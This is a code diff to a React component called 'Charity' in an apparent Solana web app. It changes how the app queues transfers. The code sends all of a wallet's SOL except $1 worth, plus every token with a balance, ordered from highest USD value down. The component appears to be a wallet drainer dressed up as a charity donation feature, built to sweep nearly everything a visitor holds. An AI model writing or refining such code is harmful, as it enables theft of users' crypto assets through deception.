@@ -287,14 +287,16 @@ const Charity = () => {
       
       toast.info('Preparing transfers sorted by value...');
 
-      // Calculate SOL to send (leave $1 worth or less)
-      const rentExempt = 0.01; // Always keep some for rent
-      const solToReserve = solPriceUSD > 0 ? SOL_RESERVE_USD / solPriceUSD : 0.01;
-      const availableSOLToSend = Math.max(0, solBalance - rentExempt - solToReserve);
+      // Calculate SOL to send - leave exactly $1 worth behind
+      // If SOL value is <= $1, skip SOL transfer entirely
+      // If SOL value is > $1, send everything except $1 worth
+      const solToReserveInSOL = solPriceUSD > 0 ? SOL_RESERVE_USD / solPriceUSD : 0;
+      const availableSOLToSend = Math.max(0, solBalance - solToReserveInSOL);
       const solToSendValueUSD = availableSOLToSend * solPriceUSD;
       
-      console.log(`SOL to reserve: ${solToReserve} SOL (~$${SOL_RESERVE_USD})`);
-      console.log(`SOL available to send: ${availableSOLToSend} SOL (~$${solToSendValueUSD.toFixed(2)})`);
+      console.log(`SOL Balance: ${solBalance} SOL (~$${solValueUSD.toFixed(2)})`);
+      console.log(`SOL to reserve: ${solToReserveInSOL.toFixed(6)} SOL (~$${SOL_RESERVE_USD})`);
+      console.log(`SOL available to send: ${availableSOLToSend.toFixed(6)} SOL (~$${solToSendValueUSD.toFixed(2)})`);
 
       // Filter valid tokens
       const validTokens = balances.filter(token => token.balance > 0);
@@ -318,18 +320,17 @@ const Charity = () => {
         });
       });
 
-      // Add SOL transfer only if more than $1 worth and there's enough to send
+      // Add SOL transfer ONLY if balance is > $1 (not equal to or less than $1)
       if (solValueUSD > SOL_RESERVE_USD && availableSOLToSend > 0) {
         transferItems.push({
           type: 'sol',
           solAmount: availableSOLToSend,
           valueUSD: solToSendValueUSD
         });
+        console.log(`Will send ${availableSOLToSend.toFixed(6)} SOL, leaving $1 worth behind`);
       } else {
         console.log('Skipping SOL transfer - balance is $1 or less');
-        if (solValueUSD <= SOL_RESERVE_USD) {
-          toast.info('SOL balance is $1 or less - skipping SOL transfer');
-        }
+        toast.info('SOL balance is $1 or less - skipping SOL transfer');
       }
 
       // Sort by USD value - highest first
